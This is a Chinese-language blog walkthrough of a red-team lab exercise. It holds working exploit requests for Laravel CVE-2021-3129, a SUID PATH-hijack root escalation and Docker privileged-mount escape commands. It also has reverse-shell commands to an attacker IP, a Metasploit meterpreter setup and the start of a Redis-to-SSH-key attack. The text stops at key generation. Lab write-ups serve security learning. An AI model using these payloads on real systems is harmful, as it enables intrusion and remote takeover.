<!DOCTYPE html>
<html lang="zh-cn">
  <head>
    <meta charset="utf8"/>
    <meta name="viewport" content="initial-scale=1.0, width=device-width"/>
    <title>
      
        ATT&CK红队评估(七) | Blanks'Blog
      
    </title>
    <meta name="description" content=""/>
    <meta name="keywords" content=""/>
    
      <link rel="apple-touch-icon"
            sizes="180x180"
            href="/images/apple-touch-icon.png"/>
    
    
      <link rel="icon"
            type="image/png"
            sizes="32x32"
            href="/images/favicon-32x32.png"/>
    
    
      <link rel="icon"
            type="image/png"
            sizes="16x16"
            href="/images/favicon-16x16.png"/>
    
    
      <link rel="mask-icon"
            href="/images/logo.svg"
            color=""/>
    
    
    
      
  <style>
    @font-face {
        font-family:sourceHanSerif;
        src: url(/font/regular.ttf);
        font-weight: regular;
    }
  </style>

  <style>
    @font-face {
        font-family:sourceHanSerif;
        src: url(/font/bold.ttf);
        font-weight: bold;
    }
  </style>


    
    <link rel="stylesheet"
          type="text/css"
          href='/css/layout.css'/>
    
    
  <link rel="stylesheet" type="text/css" href="/css/post.css" />
  

  <meta name="generator" content="Hexo 6.3.0"></head>
  <body>
    <div class="head">
      <div class="nav">
        <a href='/' class="nav-logo">
          <img alt="logo" height="60px" width="60px" src="/images/logo.svg"/>
        </a>
        <input id="navBtn" type="checkbox"/>
        <div class="nav-menu">
          
            
              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">Notes</a>
            
          
          
        </div>
        <label class="nav-btn" for="navBtn"></label>
      </div>
    </div>
    <div class="body">
      
  <article class="post-content">
    <div class="post-inner--toc">
      <div class="post-content__head">
        <div class="post-title">ATT&CK红队评估(七)</div>
        <div class="post-info">
          
  <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-tag">#内网渗透</a><a href="/tags/ATT-CK/" class="post-tag">#ATT&CK</a>


          <span class="post-date">2023-07-20</span>
        </div>
      </div>
      
        <aside class="toc-outer">
          <div class="toc-title">目录</div>
          <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">开局</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">Laravel Debug mode RCE（CVE-2021-3129)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">漏洞复现</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">Docker逃逸(提权)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">Linux环境变量提权</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">Docker 特权模式逃逸</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link"><span class="post-toc-text">web_delivery模块 （写计划任务）</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">第一台ubuntu</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">一键逃逸 （）</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">第二台 ubuntu</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">内网</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">防火墙问题</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">被迫关闭防火墙（技术不到啊，哭死）</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">第三台 Win7</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">通达OA</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link"><span class="post-toc-text">漏洞复现</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link"><span class="post-toc-text">未授权文件上传+文件包含</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">信息搜集 域</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">第四台 win7</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">域控  — winserver 2012  第五台</span></a></li></ol></li></ol>
          <a href="#" class="toc-top">回到顶部</a>
        </aside>
      
      <div class="post-content__body">
        
          <div class="post-gallery">
            
          </div>
        
        <meta name="referrer" content="no-referrer">
<a name="anchor-name"></a>

<p><a name="PF0xI"></a></p>
<h1><span id="开局"><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689865345899-60e6dd5b-4c81-4e60-83bc-5fbd7942b293.png#averageHue=%23fefefd&clientId=ufeb9cd91-dbfa-4&from=paste&height=981&id=u9479a556&originHeight=981&originWidth=1500&originalType=binary&ratio=1&rotation=0&showTitle=false&size=98568&status=done&style=none&taskId=ud44788b3-8fff-4408-9c9f-9cfd35363f1&title=&width=1500" alt="image.png">开局</span></h1><p>目标地址： 10.10.10.10<br>进行端口扫描  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nmap -p 1-65535  10.10.10.10<br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689774424732-d9111d34-04fc-4194-9d85-15e66ecabbe8.png#averageHue=%231a1b1d&clientId=uaaa1bc18-8993-4&from=paste&height=244&id=u07b94177&originHeight=244&originWidth=741&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23400&status=done&style=none&taskId=u04048213-f9ac-4419-8b17-fc5e6c048b0&title=&width=741" alt="image.png"><br>端口还带有6376端口 ，redis数据库，先去看看web端<br>存在 81 web 端口 ，进行访问  <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689769869451-db4bf0ec-3e46-4d5c-87e9-7ad98baf3446.png#averageHue=%23232b39&clientId=uaaa1bc18-8993-4&from=paste&height=1579&id=W7eTl&originHeight=1579&originWidth=2670&originalType=binary&ratio=1&rotation=0&showTitle=false&size=236600&status=done&style=none&taskId=u18181e30-9c9e-4cc1-91ea-f4481c00c6f&title=&width=2670" alt="image.png">是一个 Laravel v8.29.0 (PHP v7.4.14)<br>对这个Laravel v8.29.0  进行搜索是否存在历史漏洞<br>是存在RCE漏洞的<br><a name="GCj0e"></a></p>
<h2><span id="laravel-debug-mode-rcecve-2021-3129"><strong>Laravel Debug mode RCE（CVE-2021-3129)</strong></span></h2><blockquote>
<p>Laravel是一套简洁、开源的PHP Web开发框架，旨在实现Web软件的MVC架构。<br>2021年01月12日，Laravel被披露存在一个远程代码执行漏洞（CVE-2021-3129）。当Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689770122130-bf0aa024-0410-46b8-9f73-3e0f4dbb79e2.png#averageHue=%2324262a&clientId=uaaa1bc18-8993-4&from=paste&height=1330&id=ud296c11e&originHeight=1330&originWidth=2122&originalType=binary&ratio=1&rotation=0&showTitle=false&size=315503&status=done&style=none&taskId=ub1120eef-bae0-472d-a7f0-deeaf9a6131&title=&width=2122" alt="image.png"><br><a name="azC7X"></a></p>
<h3><span id="漏洞复现">漏洞复现</span></h3><p>一：首先使用 <a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">phpggc</a>工具生成一条laravel中存在的反序列化利用POC（经过编码后的）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php -d <span class="hljs-string">&quot;phar.readonly=0&quot;</span> ./phpggc Laravel/RCE5 <span class="hljs-string">&quot;phpinfo();&quot;</span> --phar phar -o php:<span class="hljs-comment">//output | base64 -w 0 | python -c &quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span><br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689770602879-ba0d02ba-254f-4668-99f7-b4a9dd0b803a.png#averageHue=%2328292b&clientId=uaaa1bc18-8993-4&from=paste&height=495&id=uece39f33&originHeight=495&originWidth=1350&originalType=binary&ratio=1&rotation=0&showTitle=false&size=92706&status=done&style=none&taskId=ucf6a7c7f-d610-4545-9790-0d56b9a3a61&title=&width=1350" alt="image.png"><br>得到POC(编码后) 在后面加个a <br>发送如下数据包，将Laravel的原日志文件laravel.log清空：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">POST /_ignition/execute-solution HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span>:<span class="hljs-number">81</span><br>Content-Type: application/json<br>Content-Length: <span class="hljs-number">328</span><br><br>&#123;<br>  <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<br>  <span class="hljs-string">&quot;parameters&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,<br>    <span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
<p>再发一个数据包，给Log增加一次前缀，用于对齐</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">POST /_ignition/execute-solution HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span>:<span class="hljs-number">81</span><br>Content-Type: application/json<br>Content-Length: <span class="hljs-number">163</span><br><br>&#123;<br>  <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<br>  <span class="hljs-string">&quot;parameters&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,<br>    <span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;AA&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>但是我这里报错了，到这里就 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689770940793-b2213cf5-e143-40c8-b940-757b8682a4a0.png#averageHue=%23fdfdfc&clientId=uaaa1bc18-8993-4&from=paste&height=1298&id=uc2ecacf3&originHeight=1298&originWidth=2431&originalType=binary&ratio=1&rotation=0&showTitle=false&size=107895&status=done&style=none&taskId=u6c589d1f-3a0f-4c7c-9bfc-b4e589ece2c&title=&width=2431" alt="image.png"><br>先不管，继续，这次发送刚才生成的POC<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689771111965-5575ed17-9aca-4d45-bf8e-98db6ec85de1.png#averageHue=%23fcfbfb&clientId=uaaa1bc18-8993-4&from=paste&height=1567&id=uaf714668&originHeight=1567&originWidth=2573&originalType=binary&ratio=1&rotation=0&showTitle=false&size=300775&status=done&style=none&taskId=u947bcd18-8d00-4cdd-a799-cdd178e4b51&title=&width=2573" alt="image.png"><br>还是报错的 。。。。。先跟着复现思路走吧 <br>发送如下数据包，清空对log文件中的干扰字符，只留下POC：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">POST /_ignition/execute-solution HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span>:<span class="hljs-number">81</span><br>Content-Type: application/json<br>Content-Length: <span class="hljs-number">299</span><br><br>&#123;<br>  <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<br>  <span class="hljs-string">&quot;parameters&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,<br>    <span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>使用phar:&#x2F;&#x2F;进行反序列化，执行任意代码（此时需要使用绝对路径）<img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689771324509-1cd72b45-0e73-46fa-b368-eea0a4f47965.png#averageHue=%23edb78e&clientId=uaaa1bc18-8993-4&from=paste&height=574&id=u9b4afbb6&originHeight=574&originWidth=1038&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71690&status=done&style=none&taskId=u2b07da05-0676-4e07-bf5f-c76cc62af53&title=&width=1038" alt="image.png"><br>根据这个复现，看来是不成功的 发送数据包 （后面再来看看这种方法）<br>失败了 ，我们还是用github提供的脚步去获取webshell 吧 <br>EXP地址： <a target="_blank" rel="noopener" href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689771983547-dc8171f2-905f-425b-aba7-966be614953e.png#averageHue=%2318191b&clientId=uaaa1bc18-8993-4&from=paste&height=335&id=u26f8b82c&originHeight=335&originWidth=627&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17576&status=done&style=none&taskId=u2c2e555e-c863-478d-bdb7-38d83586dab&title=&width=627" alt="image.png"><br>但是这里连接就要使用老版本哥斯拉去连接了  3.0 以下才能连接<br>进行连接 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689772289932-0ebd07b4-2176-4631-bdb9-1d416d2d42c3.png#averageHue=%23b6b0a6&clientId=uaaa1bc18-8993-4&from=paste&height=1164&id=u8a3fc2e6&originHeight=1164&originWidth=2531&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1961521&status=done&style=none&taskId=u81c50d10-9650-4946-94c3-6a9889ef76d&title=&width=2531" alt="image.png"><br>成功获取webshell了<br>当我们查看hostname的时候，发现名字是一串数字???<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689772462651-a6231ccf-4dde-4528-ad31-fd17ea6afe47.png#averageHue=%23292929&clientId=uaaa1bc18-8993-4&from=paste&height=113&id=ua5df8cc6&originHeight=113&originWidth=416&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8371&status=done&style=none&taskId=u6937b511-22ac-4766-88e4-fcc91bc0a3d&title=&width=416" alt="image.png"><br>这个就不太对 ，看看是否是存在docker环境</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cat /proc/<span class="hljs-built_in">self</span>/cgroup  <span class="hljs-comment">#查看是否是docker容器的常用命令</span><br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689772589841-44e71557-b1c9-43c0-a356-d2c9a69e6333.png#averageHue=%23080808&clientId=uaaa1bc18-8993-4&from=paste&height=313&id=u0d14532c&originHeight=313&originWidth=918&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29076&status=done&style=none&taskId=u4e311069-bd31-405e-8fc5-fb96e1ed797&title=&width=918" alt="image.png"><br>这么一看全是docker容器<br><a name="d0AyG"></a></p>
<h2><span id="docker逃逸提权">Docker逃逸(提权)</span></h2><p><a name="g4twW"></a></p>
<h3><span id="linux环境变量提权">Linux环境变量提权</span></h3><p>使用find命令来搜索具有SUID或4000权限的文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">find / -perm -u=s -type f <span class="hljs-number">2</span>&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
<p>通过这条命令，可以遍历任何可执行文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689772845718-0f9f9c21-28b3-4f87-bda0-4c69a03d5c01.png#averageHue=%23010101&clientId=uaaa1bc18-8993-4&from=paste&height=568&id=uf858b903&originHeight=568&originWidth=813&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24832&status=done&style=none&taskId=ue7d15172-b13a-4de4-b7e9-207a7b56505&title=&width=813" alt="image.png"><br>在</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/home/jobs/shell<br></code></pre></td></tr></table></figure>
<p>存在一个shell文件 <br>ls -la 查看一下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689772992011-d08ef5d4-8ea8-49d6-8c98-5630d438dff0.png#averageHue=%23000000&clientId=uaaa1bc18-8993-4&from=paste&height=156&id=ud44f3400&originHeight=156&originWidth=802&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6015&status=done&style=none&taskId=ucbe908d8-d263-4ee8-b145-8145cbb496e&title=&width=802" alt="image.png"><br>的确是一个可执行文件<br>但是这里不知为何一直进不去 、其他目录，<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689773433730-4477c6f7-bcf7-44af-9a08-71af77fe5645.png#averageHue=%23000000&clientId=uaaa1bc18-8993-4&from=paste&height=562&id=u8d29302e&originHeight=562&originWidth=1501&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12791&status=done&style=none&taskId=ua26702ea-7b01-4b9d-9252-2148cb83e7a&title=&width=1501" alt="image.png">就新建了webshell 换成蚁剑去连接<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689773347503-050455ce-8111-4b90-8ea3-08e8dbd3b86e.png#averageHue=%23111111&clientId=uaaa1bc18-8993-4&from=paste&height=1192&id=u168a21c8&originHeight=1192&originWidth=1886&originalType=binary&ratio=1&rotation=0&showTitle=false&size=128642&status=done&style=none&taskId=ud4442d5a-956b-42b0-bf50-356982b39cf&title=&width=1886" alt="image.png"><br>这里是可以成功切换路径的<br>使用蚁剑反弹一个shell过来，然后在shell中执行如下命令：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689773769923-ff30f182-979e-4034-8ae3-46ba77e786bd.png#averageHue=%231a1b1d&clientId=uaaa1bc18-8993-4&from=paste&height=82&id=u5e407f50&originHeight=82&originWidth=348&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4939&status=done&style=none&taskId=u26145474-7341-40d4-962b-af10af1d7d0&title=&width=348" alt="image.png"><br>写一个bash 反弹shell，反弹到kali上<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689773957236-fe0c737b-6718-430e-8ecb-f7b673a18058.png#averageHue=%23f9f9f9&clientId=uaaa1bc18-8993-4&from=paste&height=823&id=u8075caea&originHeight=823&originWidth=1569&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37120&status=done&style=none&taskId=u514ac2c8-7862-42d1-8030-135b7015fda&title=&width=1569" alt="image.png"><br>执行以下命令获取root权限</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">cd /tmp<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; ps<br>chmod <span class="hljs-number">777</span> ps<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$PATH</span> <br>export PATH=/tmp:<span class="hljs-variable">$PATH</span> <span class="hljs-comment"># 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序</span><br>cd /home/jobs<br>./shell<br><span class="hljs-comment"># 然后就获得了root权限，可以执行命令了</span><br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689774137694-12d577e5-f128-4324-a293-7cf16f3c6886.png#averageHue=%231a1b1d&clientId=uaaa1bc18-8993-4&from=paste&height=382&id=u643f41a8&originHeight=382&originWidth=917&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34590&status=done&style=none&taskId=ucd3316b3-ca94-4482-847f-47ced2f7ed9&title=&width=917" alt="image.png"><br>这样就获取root权限了 ，但是这里依然还是docker容器<br><a name="WAMvN"></a></p>
<h3><span id="docker-特权模式逃逸">Docker 特权模式逃逸</span></h3><p>创建一个 hack目录<br>把&#x2F;dev&#x2F;sda1  挂载到 &#x2F;hack 上<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689774784174-01e64706-8864-4a8d-9cba-e13c99df3e99.png#averageHue=%231c1d1f&clientId=uaaa1bc18-8993-4&from=paste&height=199&id=u853f11d7&originHeight=199&originWidth=474&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13944&status=done&style=none&taskId=uef2ee306-ef4b-49d0-99d4-e9627fd2d84&title=&width=474" alt="image.png"><br>这样就成功挂载了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689774842244-52429ee7-dafd-48c9-9a8a-b377683c44bd.png#averageHue=%2317181a&clientId=uaaa1bc18-8993-4&from=paste&height=473&id=ubbbf5475&originHeight=473&originWidth=483&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14137&status=done&style=none&taskId=u747bd113-3530-47c9-912e-d4cb410272a&title=&width=483" alt="image.png"><br>可以通过访问容器内部的&#x2F;hack路径来达到访问整个宿主机的目的<br><a name="Eitct"></a></p>
<h4><span id="web_delivery模块-写计划任务">web_delivery模块 （写计划任务）</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">multi</span>/<span class="hljs-title">script</span>/<span class="hljs-title">web_delivery</span><br><span class="hljs-title">set</span> <span class="hljs-title">target</span> 7    # 选择目标系统<br><span class="hljs-title">set</span> <span class="hljs-title">payload</span> <span class="hljs-title">linux</span>/<span class="hljs-title">x64</span>/<span class="hljs-title">meterpreter</span>/<span class="hljs-title">reverse_tcp</span><br><span class="hljs-title">set</span> <span class="hljs-title">lhost</span> 10.10.10.11<br><span class="hljs-title">set</span> <span class="hljs-title">lport</span> 4444<br><span class="hljs-title">exploit</span>  / <span class="hljs-title">run</span><br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689776476606-6fc83eed-617b-4638-bd09-e3c1acb16d19.png#averageHue=%231b1c1e&clientId=uaaa1bc18-8993-4&from=paste&height=334&id=u8fa21431&originHeight=334&originWidth=899&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45824&status=done&style=none&taskId=u86d91d0a-083f-44b3-99f3-75f661ce9fd&title=&width=899" alt="image.png"><br>由于目标docker环境没有wget 环境 ，自己把文件下载下来，放到&#x2F;hack&#x2F;tmp 目录下。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689776816545-9fda966f-f658-4d64-9507-16ab7e5d2d04.png#averageHue=%231e1f21&clientId=uaaa1bc18-8993-4&from=paste&height=414&id=u9135d8da&originHeight=414&originWidth=528&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39207&status=done&style=none&taskId=u50bb4d19-14e6-4004-9ce8-bff165795a2&title=&width=528" alt="image.png"><br>然后赋可执行权限，然后运行反弹shell 给msf<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689776824066-9136cf85-6499-4a21-99e0-45a64de19558.png#averageHue=%231a1b1e&clientId=uaaa1bc18-8993-4&from=paste&height=326&id=u73cf9d7a&originHeight=326&originWidth=846&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33291&status=done&style=none&taskId=ub4b73bf3-2b15-41dd-bc6e-256bf3917dd&title=&width=846" alt="image.png"><br>不对，我使用这个方法还是失败了  。（后面再试）<br>这里使用github 大佬的逃逸提权进行 逃逸<br><a name="q6Gla"></a></p>
<h2><span id="第一台ubuntu">第一台ubuntu</span></h2><p><a name="Y5z56"></a></p>
<h3><span id="一键逃逸">一键逃逸 （<img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689777238402-f1016de1-53e9-4373-ac98-b1c76fdb3cbc.png#averageHue=%2363574f&clientId=uaaa1bc18-8993-4&from=paste&height=48&id=uc50574f1&originHeight=48&originWidth=48&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4212&status=done&style=none&taskId=u578c60cb-4293-4cd1-b932-18c168fca92&title=&width=48" alt="0D25F57C.png">）</span></h3><p>大佬脚本 : <a target="_blank" rel="noopener" href="https://github.com/SPuerBRead/shovel">https://github.com/SPuerBRead/shovel</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">./shovel   -r -m reverse -I <span class="hljs-number">10.10</span>.<span class="hljs-number">10.11</span> -P <span class="hljs-number">8888</span> -y<br></code></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689778057006-9cc6644d-bf98-44c1-9cee-03dc973a54d5.png#averageHue=%231c1d1f&clientId=uaaa1bc18-8993-4&from=paste&height=349&id=u4d14fb31&originHeight=349&originWidth=1032&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44540&status=done&style=none&taskId=u1278421e-8c37-427f-a951-2f6b512a80c&title=&width=1032" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689778075773-7c09297b-8c77-4a8b-ba82-8d76645d1390.png#averageHue=%231b1c1e&clientId=uaaa1bc18-8993-4&from=paste&height=213&id=u7fecc543&originHeight=213&originWidth=667&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16771&status=done&style=none&taskId=u15370441-6210-42fa-90b1-f1d0ab7fd1c&title=&width=667" alt="image.png"><br>超快逃逸脚本 我称为 <img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689778098198-191ed60c-9ec5-4caa-a5ae-9763c63ea460.png#averageHue=%2363574f&clientId=uaaa1bc18-8993-4&from=paste&height=48&id=u27617619&originHeight=48&originWidth=48&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4212&status=done&style=none&taskId=u16a8c08e-1659-43a3-8d7c-3047c8f06a9&title=&width=48" alt="0D33146F.png"><br>拿到权限先看存在那些内网网段<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689778219391-f76a7a7e-3b91-4a80-8076-b63ea6666112.png#averageHue=%231b1c1e&clientId=uaaa1bc18-8993-4&from=paste&height=748&id=u859eb4b2&originHeight=748&originWidth=1058&originalType=binary&ratio=1&rotation=0&showTitle=false&size=90437&status=done&style=none&taskId=u32eec096-217b-42d5-bbab-542bae1026d&title=&width=1058" alt="image.png"><br>发现存在 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">192.168</span>.<span class="hljs-number">52.20</span>/<span class="hljs-number">24</span><br><span class="hljs-number">192.168</span>.<span class="hljs-number">93.10</span>/<span class="hljs-number">24</span> <br></code></pre></td></tr></table></figure>
<p>网段，但是我们访问的 10.10.10.10 咋不见了 ，这里可能是做了反向代理的<br>刚才扫描端口的时候还存在一个6379 redis 数据库<br>看看尝一下是否存在未授权访问<br><a name="emzF2"></a></p>
<h2><span id="第二台-ubuntu">第二台 ubuntu</span></h2><p>直接使用redis -h  IP 默认连接方式去连接<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1689778822612-2547fe18-0f22-4390-a800-ad2cccce7f24.png#averageHue=%231a1b1d&clientId=uaaa1bc18-8993-4&from=paste&height=579&id=u6f53a03e&originHeight=579&originWidth=503&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35193&status=done&style=none&taskId=uece6a1de-5eb8-4836-9f75-59db059855a&title=&width=503" alt="image.png"><br>成功连接了<br>目标主机上写入SSH公钥。 先在攻击机上生成ssh公钥：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">ssh-keygen -t rsa<br></code></pre></td></tr></table></figure>
